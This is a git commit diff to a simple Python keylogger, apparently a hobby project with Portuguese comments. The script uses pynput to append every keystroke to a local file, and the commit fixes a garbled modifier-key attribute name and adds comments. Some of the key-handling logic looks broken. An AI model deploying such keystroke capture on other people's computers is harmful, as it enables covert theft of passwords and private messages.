efe5835c33603806a8169e939929e5d078bc10ba
pedroscatali <65991272+pedroscatali@users.noreply.github.com>
2024-04-01 20:53:12 -0300

    Update Keylogger.py

--- Keylogger.py
+++ Keylogger.py
@@ -3,15 +3,18 @@ from pynput import keyboard
 def on_press(key):
     try:
         file = open("output.txt", "a")
+
+        # Trata teclas especiais como Enter e Espaço
         if str(key) == "Key.enter":
             file.write("\n")
         elif str(key) == "Key.space":
             file.write(' ')
         # Verifica se Ctrl, Alt, Shift ou Meta foram pressionados
-        elif key.ctrl or key.alt or key.shift or key.mikawudhawiodieta:
+        elif key.ctrl or key.alt or key.shift or key.meta:
             file.write('[' + str(key).removeprefix('Key.') + ']')
         else:
             file.write(key.char)
+
         file.close()
         
     except AttributeError:
@@ -19,6 +22,6 @@ def on_press(key):
         file.write(str(key))
         file.close()
 
-# Collect events until released
+# Inicia o listener para captura de teclas
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
